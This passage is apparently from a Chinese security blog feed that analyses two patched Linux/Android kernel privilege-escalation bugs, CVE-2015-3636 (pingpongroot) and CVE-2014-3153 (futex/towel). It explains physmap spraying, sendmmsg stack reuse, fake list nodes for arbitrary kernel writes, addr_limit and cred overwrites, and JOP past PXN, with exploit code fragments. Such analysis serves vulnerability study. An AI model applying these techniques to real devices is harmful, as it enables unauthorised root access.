<p>在内核空间中，physmap和SLABs一般会处于不同的地方，physmap位于相对较高的地址，SLABs位于相对较低的地址，由于内核空间里physmap和SLABs靠得很近，可以通过先创建大量的socket对象抬高SLAB地址，exp中会先获取单个进程可创建的最大socket数max_fds，然后循环每个进程创建max_fds个正常的socket然后加上一个漏洞的vul_socket，最终生成了65000个正常的socket加上16个vul_socket。</p>
<p>然后在用户空间不断map内存把数据映射到physmap，通过特殊标记判断内核空间physmap是否和SLAB重叠。<br>如何判断targeting vulnerable PING sock objects已经被physmap中的数据给覆盖？<br>每喷一个数据块，就调用一次targeting vulnerable PING sock objects的<code>ioctl(sockfd, SIOCGSTAMPNS, (struct timespec*))</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_get_timestampns</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="keyword">struct</span> timespec __user *userstamp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> timespec ts;</span><br><span class="line">    <span class="keyword">if</span> (!sock_flag(sk, SOCK_TIMESTAMP))</span><br><span class="line">        sock_enable_timestamp(sk, SOCK_TIMESTAMP);</span><br><span class="line">    ts = ktime_to_timespec(sk-&gt;sk_stamp);</span><br><span class="line">    <span class="keyword">if</span> (ts.tv_sec == -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOENT;</span><br><span class="line">    <span class="keyword">if</span> (ts.tv_sec == <span class="number">0</span>) &#123;</span><br><span class="line">        sk-&gt;sk_stamp = ktime_get_real();</span><br><span class="line">        ts = ktime_to_timespec(sk-&gt;sk_stamp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> copy_to_user(userstamp, &amp;ts, <span class="keyword">sizeof</span>(ts)) ? -EFAULT : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数将泄漏出sk-&gt;sk_stamp这个值，我们可以通过对比这个值和之前填充的值来判断是否已经成功覆盖。</p>
<p>最终效果如下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3636-1.png" alt=""></p>
<p>如果覆盖成功，将其他正常的socket对象释放掉，然后将vul_socket的sk-&gt;sk_prot-&gt;close函数指针覆盖掉，最终调用close函数，内核将调用sk-&gt;sk_prot-&gt;close，这个时候，sk_prot已经完全被控制，即sk_prot-&gt;close也被控，最终控制了内核空间的pc寄存器的值，控制了代码的执行流程。</p>
<h2 id="JOP">JOP</h2><p>通过构造JOP绕过PXN保护，关于PXN参考:<a href="http://drops.wooyun.org/tips/7764" target="_blank" rel="external">PXN防护技术的研究与绕过</a><br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3636-3.png" alt=""></p>
<h2 id="补丁">补丁</h2><p><a href="https://github.com/torvalds/linux/commit/a134f083e79fb4c3d0a925691e732c56911b4326?diff=split" target="_blank" rel="external">漏洞补丁</a>比较简单，删除指针后将指针置NULL。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3636-2.png" alt=""></p>
<h2 id="总结">总结</h2><ol>
<li><p>源码中查看实socket创建和close流程不容易找到调用关系，可编译goldfish内核进行调试。</p>
</li>
<li><p>实际在nexus5运行exp并不能触发漏洞，发现抬高过slab内存块之后进行循环map操作，一直没有找到重叠的部分导致while死循环，原因是作者在写exp时保留了系统运行的64M内存，而重叠的部分恰好是在这块内存中，将其尝试变小即可。</p>
</li>
<li><p>再给的exp中覆盖的close地址为用户空间地址<code>obtain_root_privilege_by_modify_task_cred</code>，该处用来修改线程cred信息并提权操作，在android5.0以后的版本中有PXN保护，并不允许内核执行用户层代码，所以需要构造ROP绕过。构造ROP的思路在KeenTeam的pdf中有详细说明，使用ROP意味着需要将内核栈转移到用户栈空间中，这种行为损坏SP寄存器并带来不确定因素，SP在内核代码执行期间比较关键，任何时候修改破坏是不明智的，所以其中使用的是更稳定的JOP。</p>
</li>
<li><p>理解SLUB内存管理机制和physmap。</p>
</li>
<li><p>KeenTeam文章中的利用思路，详细说明了为什么不通过sendmmsg()完成堆喷来覆盖，其中的一些思路和想法确实值得深思和学习。</p>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="漏洞简介">漏洞简介</h2><p>Linux kernel的ping套接字实现上存在释放后重利用漏洞，x86-64架构的本地用户利用此漏洞可造成系统崩溃，非x86-64架构的用户可提升其权限，pingpongroot就是利用该漏洞达到提权的效果，现在androi]]>
    </summary>
    
      <category term="cve" scheme="http://blog.idhyt.com/tags/cve/"/>
    
      <category term="pingpongroot" scheme="http://blog.idhyt.com/tags/pingpongroot/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2014-3153内核漏洞分析]]></title>
    <link href="http://blog.idhyt.com/2016/02/26/exploit-cve-2014-3153/"/>
    <id>http://blog.idhyt.com/2016/02/26/exploit-cve-2014-3153/</id>
    <published>2016-02-26T09:15:11.000Z</published>
    <updated>2017-01-02T09:00:09.000Z</updated>
    <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>漏洞是14年5月份爆，属于linux内核漏洞，影响范围非常广，包括linux系统（内核版本3.14.5之前）和andorid系统（系统版本4.4之前）。受影响的系统可能被直接DOS，精心设计可以获取root权限，如安卓root工具towel。</p>
<p>该漏洞主要产生于内核的 Futex系统调用，漏洞利用了 futex_requeue，futex_lock_pi，futex_wait_requeue_pi三个函数存在的两个漏洞，通过巧妙的组合这三个系 统调用，攻击者可以造成futex变量有等待者，却没有拥有者，即所谓的野指针，通过函数栈填充，可以修改栈上的等待者rt_mutex中的数据，控制内核等待队列节点，通过插入节点的方式读写内核数据，达到提权目的。</p>
<p>这个漏洞网上分析文章比较多，详见参考文章，这里只记录自己在分析过程中踩过的坑和几个漏洞利用的技术点。</p>
<h2 id="漏洞成因">漏洞成因</h2><p>漏洞主要利用的三个函数futex_requeue，futex_lock_pi，futex_wait_requeue_pi，简单说明，详细自行google。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加锁的函数，在uaddr1上等待</span></span><br><span class="line">futex_lock_pi (uaddr) </span><br><span class="line"></span><br><span class="line"><span class="comment">//Wait on uaddr1 and take uaddr2 线程阻塞在uaddr1上，然后等待futex_requeue的唤醒，唤醒过程将所有阻塞在 uaddr1上的线程全部移动到uaddr2上去，以防止“惊群”的情况发生</span></span><br><span class="line">futex_wait_requeue_pi(uaddr1, uaddr2)  </span><br><span class="line"></span><br><span class="line"><span class="comment">//Requeue waiters from uaddr1 to uaddr2 唤醒过程将所有阻塞在 uaddr1上的线程全部移动到uaddr2上去，以防止“惊群”的情况发生</span></span><br><span class="line">futex_requeue(uaddr1, uaddr2)</span><br></pre></td></tr></table></figure>
<p>uaddr在内核中会对应一个”等待队列”（其实是一个全局的队列），每个挂起的进程在等待队列中对应一个futex_q结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> futex_q &#123;</span><br><span class="line">    <span class="keyword">struct</span> plist_node <span class="built_in">list</span>;             <span class="comment">// 链入等待队列</span></span><br><span class="line">    <span class="keyword">struct</span> task_struct *task;           <span class="comment">// 挂起的进程本身</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> *lock_ptr;               <span class="comment">// 保存等待队列的锁，便于操作</span></span><br><span class="line">    <span class="keyword">union</span> futex_key key;                <span class="comment">// 唯一标识uaddr的key值</span></span><br><span class="line">    <span class="keyword">struct</span> futex_pi_state *pi_state;    <span class="comment">// 进程正在等待的锁</span></span><br><span class="line">    <span class="keyword">struct</span> rt_mutex_waiter *rt_waiter;  <span class="comment">// 进程对应的rt_waiter</span></span><br><span class="line">    <span class="keyword">union</span> futex_key *requeue_pi_key;    <span class="comment">// 等待被requeue的key</span></span><br><span class="line">    u32 <span class="built_in">bitset</span>;                         <span class="comment">// futex_<span class="label">XXX_bitset时使用</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>漏洞触发流程图：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2014-3153-1.jpg" alt="exploit-cve-2014-3153-1"></p>
<p>1.线程线程A调用futex_lock_pi(B)获取锁B，</p>
<p>2.线程B调用futex_wait_requeue_pi(A, B)阻塞在A上等待futex_requeue唤醒，</p>
<p>3.线程A调用futex_requeue(A, B)去唤醒B，但是B已经被锁，所以无法唤醒线程B，并进入内核态在锁B的任务队列中生成了一个rt_waiter节点</p>
<p>4.线程A将B置0重新调用futex_requeue(B, B)，此时成功获得锁B并返回，分支走向支会走向 requeue_pi_wake_futex，尝试唤醒等待的线程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span></span><br><span class="line"><span class="keyword">void</span> <span class="title">requeue_pi_wake_futex</span><span class="params">(<span class="keyword">struct</span> futex_q *q, <span class="keyword">union</span> futex_key *key,</span><br><span class="line">               <span class="keyword">struct</span> futex_hash_bucket *hb)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    get_futex_key_refs(key);</span><br><span class="line">    q-&gt;key = *key;</span><br><span class="line"> </span><br><span class="line">    __unqueue_futex(q);</span><br><span class="line"> </span><br><span class="line">    WARN_ON(!q-&gt;rt_waiter);</span><br><span class="line">    q-&gt;rt_waiter = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    q-&gt;lock_ptr = &amp;hb-&gt;lock;</span><br><span class="line"> </span><br><span class="line">    wake_up_state(q-&gt;task, TASK_NORMAL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意，这里线程B的futex_q.rt_waiter被置NULL了。</p>
<p>5.线程B被唤醒，futex_wait_requeue_pi(A, B)执行成功。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">futex_wait_requeue_pi</span><span class="params">(u32 __user *uaddr, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags,</span><br><span class="line">                 u32 val, ktime_t *abs_time, u32 <span class="built_in">bitset</span>,</span><br><span class="line">                 u32 __user *uaddr2)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> hrtimer_sleeper timeout, *to = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">struct</span> rt_mutex_waiter rt_waiter;</span><br><span class="line">    <span class="keyword">struct</span> rt_mutex *pi_mutex = <span class="literal">NULL</span>;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if the requeue code acquired the second futex for us. */</span></span><br><span class="line">    <span class="keyword">if</span> (!q.rt_waiter) &#123;</span><br><span class="line">        <span class="comment">/*</span><br><span class="line">         * Got the lock. We might not be the anticipated owner if we</span><br><span class="line">         * did a lock-steal - fix up the PI-state in that case.</span><br><span class="line">         */</span></span><br><span class="line">        <span class="keyword">if</span> (q.pi_state &amp;&amp; (q.pi_state-&gt;owner != current)) &#123;</span><br><span class="line">            spin_lock(q.lock_ptr);</span><br><span class="line">            ret = fixup_pi_state_owner(uaddr2, &amp;q, current);</span><br><span class="line">            spin_unlock(q.lock_ptr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/*</span><br><span class="line">         * We have been woken up by futex_unlock_pi(), a timeout, or a</span><br><span class="line">         * signal.  futex_unlock_pi() will not destroy the lock_ptr nor</span><br><span class="line">         * the pi_state.</span><br><span class="line">         */</span></span><br><span class="line">        WARN_ON(!&amp;q.pi_state);</span><br><span class="line">        pi_mutex = &amp;q.pi_state-&gt;pi_mutex;</span><br><span class="line">        ret = rt_mutex_finish_proxy_lock(pi_mutex, to, &amp;rt_waiter, <span class="number">1</span>);</span><br><span class="line">        debug_rt_mutex_free_waiter(&amp;rt_waiter);</span><br><span class="line">         ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在futex_wait_requeue_pi函数中将会走后边的第一个分支，导致rt_waiter没有从q.pi_state-&gt;pi_mutex摘除，从而导致了UAF。</p>
<h2 id="漏洞利用">漏洞利用</h2><p>详细的漏洞利用过程网上的一些文章已经分析的很清楚了，这里只记录一些技术点。</p>
<h3 id="修改内核数据">修改内核数据</h3><p>修改rt_waiter内容时候用的方法是栈复用，比如A申请了一个0x10大小的栈stack，A用完后stack的内容并不会在函数返回时清空，如果此时B再申请同样一个小小的栈，就会复用A申请的栈空间，利用相同的原理可以复用链表，详细的例子可参考其他分析文章。</p>
<p>在利用代码中，sendmmsg() API构造内核消息对象B，只要消息大小加上消息头的大小等于rt_waiter的大小， 那么这个消息很可能会重用rt_waiter占据过的内存。</p>
<p>其中sendmmsg() 函数栈上数据与rt_waiter的重叠部分为msgvec.msg_name的部分内容和数据是iovstack（*（msgvec.msg_iov））的部分内容，所以填充这些地方的数据即可。</p>
<p>注意，当目标接受到数据后这个函数会立刻返回，利用代码中通过创建一个线程连接到本地端口，从该端口中接受数据，但是不执行读数据操作，形似：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bind()</span><br><span class="line">listen()</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      s = accept();</span><br><span class="line">      <span class="built_in">log</span>(<span class="string">"i have a client like hookers"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就像将该函数hook掉一样，这个sendmmsg()函数将保存发送状态而不是立刻返回，从而保证数据能保留在内核栈中。</p>
<h3 id="读写内核地址">读写内核地址</h3><p>读内核地址比较容易，通过控制进程优先级向fake_node节点插入前置节点，那么fake_node.node_list.prev即为插入节点的内核地址。</p>
<p>写内核地址稍微绕一点，通过控制进程优先级向两个节点中插入新节点，如下图所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2014-3153-2.jpg" alt="exploit-cve-2014-3153-2"></p>
<p>优先级从右到左依次减小，比如分别取33，34，35，往中间插入优先级为34的新节点时，内核会先遍历这个链表，并获取优先级，内核遍历到fake_node节点，发现优先级为35，决定往fake_node节点前插入34，这个过程是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fake_node.prev.next = new_node;</span><br><span class="line">new_node.prev = fake_node.prev;</span><br><span class="line">fake_node.prev = new_node;</span><br><span class="line">new_node.next = fake_node;</span><br></pre></td></tr></table></figure>
<p>修改fake_node.prev即33的next指针内容为新节点地址，即写入了一个内核地址，所以可以通过修改fake_node.prev的值来写入任意地址。</p>
<h3 id="提权">提权</h3><p>提权是通过修改自身线程的权限信息来达到修改权限的目的，但是要修改这些值就必须有读写权限。</p>
<p>这里有个thread_info概念，每个线程都有一个线程栈，在栈的最底端存放这thread_info结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> thread_info &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> preempt_count;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> addr_limit;</span><br><span class="line">    <span class="keyword">struct</span> task_struct *task;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中addr_limit的值即用户可访问的最大内存地址，将这个值改为0xffffffff即可访问任何内核空间，从而能够修改权限。</p>
<p>如何或得这个地址？先来看下如何获取thread_info的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> thread_info *<span class="title">current_thread_info</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> thread_info *)</span><br><span class="line">	(current_stack_pointer &amp; ~(THREAD_SIZE - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>THREAD_SIZE为8192，因此thread_info = $sp &amp; 0xffffe000。<br>thread_info = 栈地址 &amp; 0xffffe000，所以&amp; addr_limit = * thread_info + 8</p>
<p>然后通过上边写内核的方法可以改写addr_limit的值，但是有一个问题是，这个改写的值是rt_waiter的地址，而这个地址又是不可控的，所以造成的结果是改的这个值比原来的还小。</p>
<p>利用代码用了一个巧妙的方法，通过不断生成新的rt_waiter，并判断新的rt_waiter的值是否比要改线程的thread_info地址大，如果大就能保证写进去的值比原来addr_limit值大，这样线程就有了访问自身addr_limit的能力，然后自己将addr_limit改为0xffffffff，伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rt_waiter_A = create_mew_rt_waiter();</span><br><span class="line">thread_info_base_A = rt_waiter_A &amp; <span class="number">0xffffe000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * thread_A_addr_limit = &amp; thread_info_base_A-&gt;addr_limit; </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    rt_waiter_B = create_mew_rt_waiter();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rt_waiter_B &gt; rt_waiter_A) &#123;</span><br><span class="line"><span class="comment">// write rt_waiter_B to thread_info_base_A-&gt;addr_limit</span></span><br><span class="line">thread_info_base_A-&gt;addr_limit = rt_waiter_B;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// thread A could write addr_limit</span></span><br><span class="line">thread_info_base_A-&gt;addr_limit = <span class="number">0xffffffff</span>;</span><br></pre></td></tr></table></figure>
<p>最后在该线程中通过修改线程的thread_info.task_struct -&gt; cred -&gt; secutiry进行提权，修改内容如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">credbuf.uid = <span class="number">0</span>;</span><br><span class="line">credbuf.gid = <span class="number">0</span>;</span><br><span class="line">credbuf.suid = <span class="number">0</span>;</span><br><span class="line">credbuf.sgid = <span class="number">0</span>;</span><br><span class="line">credbuf.euid = <span class="number">0</span>;</span><br><span class="line">credbuf.egid = <span class="number">0</span>;</span><br><span class="line">credbuf.fsuid = <span class="number">0</span>;</span><br><span class="line">credbuf.fsgid = <span class="number">0</span>;</span><br><span class="line">credbuf.cap_inheritable.cap[<span class="number">0</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_inheritable.cap[<span class="number">1</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_permitted.cap[<span class="number">0</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_permitted.cap[<span class="number">1</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_effective.cap[<span class="number">0</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_effective.cap[<span class="number">1</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_bset.cap[<span class="number">0</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">credbuf.cap_bset.cap[<span class="number">1</span>] = <span class="number">0xffffffff</span>;</span><br><span class="line">securitybuf.osid = <span class="number">1</span>;</span><br><span class="line">securitybuf.sid = <span class="number">1</span>;</span><br><span class="line">taskbuf.pid = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h3 id="判断cpu进入内核">判断cpu进入内核</h3><p>当系统调用syscall时，<code>/proc/PID/task/TID/status</code>中voluntary_ctxt_switches会增加<br>在Linux中可以通过/proc看出cpu切入/切出次数，<br>比如 PID = 27288，用cat 命令搞一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/<span class="number">27288</span>/status</span><br><span class="line">...</span><br><span class="line">voluntary_ctxt_switches: <span class="number">9950</span></span><br><span class="line">nonvoluntary_ctxt_switches: <span class="number">17104</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这里的9950和17104分别就是切入/切出 CPU的次数。<br>除了status之外，还可以看/proc/27288/schedstat 字段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/<span class="number">27288</span>/schedstat</span><br><span class="line"><span class="number">1119480311</span> <span class="number">724745506</span> <span class="number">27054</span></span><br></pre></td></tr></table></figure>
<p>此处 27054 就是上面两个数值的和，代表切入切出总数值。</p>
<h3 id="伪终端">伪终端</h3><p>通过创建伪终端读数据，使线程阻塞，在修改addr_limit的过程中就是通过这种方法进行等待修改。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HACKS_fdm = open(<span class="string">"/dev/ptmx"</span>, O_RDWR);</span><br><span class="line"> </span><br><span class="line">unlockpt(HACKS_fdm);    <span class="comment">// 允许对伪终端从设备的访问</span></span><br><span class="line">slavename = ptsname(HACKS_fdm); <span class="comment">// 函数用于在给定主伪终端设备的文件描述符时，找到从伪终端设备的路径名</span></span><br><span class="line">open(slavename, O_RDWR);</span><br><span class="line">...</span><br><span class="line">read(HACKS_fdm, readbuf, <span class="keyword">sizeof</span> readbuf);</span><br></pre></td></tr></table></figure>
<h3 id="伪造节点">伪造节点</h3><p>利用代码中setup_exploit方法生成的两个可控节点方法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">setup_exploit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> mem)</span> </span>&#123;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (mem - <span class="number">0x04</span>)) = <span class="number">0x81</span>;   <span class="comment">// prio = 129-120 = 9</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (mem + <span class="number">0x00</span>)) = mem + <span class="number">0x20</span>; <span class="comment">// rt_waiter9.prio_list.next = rt_waiter13</span></span><br><span class="line">    <span class="comment">//  + 0x04 = prio_list.prev</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (mem + <span class="number">0x08</span>)) = mem + <span class="number">0x28</span>; <span class="comment">// rt_waiter9.node_list.next = rt_waiter13.node_list</span></span><br><span class="line">    <span class="comment">// + 0x0c = node_list.prev</span></span><br><span class="line"> </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (mem + <span class="number">0x1c</span>)) = <span class="number">0x85</span>;   <span class="comment">// prio = 133-120 = 13</span></span><br><span class="line">    <span class="comment">// + 0x20 = prio_list.next</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (mem + <span class="number">0x24</span>)) = mem;    <span class="comment">// rt_waiter13.prio_list.prev = rt_waiter9</span></span><br><span class="line">    <span class="comment">// + 0x28 = node_list.next</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (mem + <span class="number">0x2c</span>)) = mem + <span class="number">8</span>;    <span class="comment">// rt_waiter13.node_list.prev = rt_waiter9.node_list</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个是根据plist_node结构生成的两个节点，优先级分别为9和13，plist_node结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> plist_node &#123;</span><br><span class="line">    <span class="keyword">int</span> prio;   <span class="comment">// 4</span></span><br><span class="line">    <span class="keyword">struct</span> list_head    prio_list;  <span class="comment">// 0x8</span></span><br><span class="line">    <span class="keyword">struct</span> list_head    node_list;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>整个利用代码都是通过向这两个节点中插入来读写内核的，其中参数long mem指向的是prio=9的prio_list，mem-4处填写的是其优先级。</p>
<h3 id="arm移植x86">arm移植x86</h3><p>x86和arm唯一区别就是thread_info结构不同，x86的thread_info结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> thread_info &#123;</span><br><span class="line">    <span class="keyword">struct</span> task_struct  *task;          <span class="comment">/* main task structure */</span></span><br><span class="line">    <span class="keyword">struct</span> exec_domain  *exec_domain;   <span class="comment">/* execution domain */</span></span><br><span class="line">    __u32           flags;              <span class="comment">/* low level flags */</span></span><br><span class="line">    __u32           status;             <span class="comment">/* thread synchronous flags */</span></span><br><span class="line">    __u32           cpu;                <span class="comment">/* current CPU */</span></span><br><span class="line">    <span class="keyword">int</span>             preempt_count;      <span class="comment">/* 0 =&gt; preemptable,</span><br><span class="line">                                   &lt;0 =&gt; BUG */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  addr_limit;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>所以稍作修改就能移植过去，代码参考<a href="https://github.com/lieanu/CVE2014-3153" target="_blank" rel="external">https://github.com/lieanu/CVE2014-3153</a></p>
<h2 id="总结">总结</h2><ol>
<li>栈复用技巧（sendmmsg函数的使用）</li>
<li>利用链表达到任意地址写的技巧</li>
<li>修改addr_limit及cred技巧，利用技巧很通用，基本适合任何能够泄露内核地址的漏洞</li>
<li>gdb内核调试</li>
</ol>
